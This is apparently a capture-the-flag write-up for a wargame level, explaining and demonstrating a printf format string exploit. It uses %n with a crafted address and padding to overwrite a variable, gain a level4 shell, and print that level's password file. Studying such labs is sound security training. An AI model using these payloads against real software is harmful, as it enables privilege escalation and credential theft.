# level3

This article gives an in-depth explanation of the [format string attack](https://dev.to/duracellrabbid/journey-to-understand-format-string-attack-part-1-5dda) used in this level.

---

Nothing of note with `ll` and `checksec`.

Functions found using `gdb > info functions`
|LIBC|user|
|-|-|
|printf|main|
|fgets|frame_dummy|
|fwrite|v|
|system||

This time we have access to the `system` function. So we will probably have to access it using a return address overwrite.
Unfortunately, now the `fget` function is used. Unlike it's brother, it cannot be exploited in a classical buffer overflow attack, we will have to look elsewhere then.

Let's see `printf`'s man now
```
BUGS
       [...]
       Code  such  as  printf(foo); often indicates a bug, since foo may contain a % character.  If
       foo comes from untrusted user input, it may contain %n, causing the printf() call  to  write
       to memory and creating a security hole.
```

How can we make use of that?

If we look at the source code, we can see that the `system()` function is locked behind a condition : `if (m == 0x40)` (0x40 being 64 in decimal). So if we managed to set the value of **m** to 64 this would theorically achieve a privilege escalation through the `system()` function call.

## GDB example
Great! Let's do this. We can just open gdb, set a breakpoint at the beginning of the `v` function, set **m** and we'll be able to start **level4**!
```sh
gdb level3

gdb > breakpoints v			# set the breakpoint
gdb > running				# run the program until the breakpoint
gdb > set variable m=64
gdb > print m
$1 = 64						# m is set to 64
gdb > continue
foobar
foobar						# this is the fgets prompt
Wait what?!
$							# Hey, we did it!

$ whoami
level3
```

... Should it not show up as **level4**? We reached the `system()` function call and opened a new shell right? And the binary has **level4** permissions. Why did this not work ?

Well the binary indeed has **level4** permissions but gdb uses our own permissions. This means that even though we reached `system()`, it is only as **level3**. Nice try though!

## True example

Manually changing the value of **m** through gdb did not work (did you really think it would?). On the plus side our theory is correct; by setting **m** to **64** we will reach the `system()` function.

`printf()`'s man tells us that the `%n` flag could write to memory. How does it work ?
The %n flag puts the number of characters printed until now in the pointer that matches it's placement. Here's an example.

```c
int n = 0;
printf("1234%n", *n);
// n now equals 4, since 4 characters were printed.
```

So, our `printf()` must contain 64 characters, the address of **m** and the means to write on it.

We can just find the address of **m** using **Ghidra**. It's `0x0804988c` and becomes `\x8c\x98\x04\x08` in writable little endian.

[Owasp's article on string attacks](https://owasp.org/www-community/attacks/Format_string_attack) tells us that `printf()` can print the stack preceding the call. Let's test this with an **EGG** (identifiable string in memory, in our case AAAA) then.

```sh
$ echo "AAAA %x %x %x %x" | ./level3
aaaa 200 b7fd1ac0 b7ff37d0 61616161
```
Here `%x` points to the hex value at the corresponding stack address.
We can see **200** which is the hexadecimal size of our buffer, as well as **61616161** which is our **EGG**. This means that the `printf` buffer is the 4th argument printed.

This is where it gets tricky. Our buffer itself will become the target. If the beginning of our buffer is the address of **m**, and `%n` targets the beginning of our buffer it will instead target **m**. If that is not clear enough ask Alec.

So our buffer will look like this :
|address of m|padding to reach 64 bytes|the targeting of the 4th argument|
|-|-|-|
|\x8c\x98\x04\x08|%60d|%4$n|

```sh
(cat <(python -c 'print "\x8c\x98\x04\x08%60d%4$n"') -) | ./level3
```

```sh
$ whoami
level4
$ cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

We did it for real this time! On to the next level then.

```sh
su level4
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```


Note :
```
%Xd writes at least X characters in front of the number
%X$n targets the X argument of the printf using the n flag
```
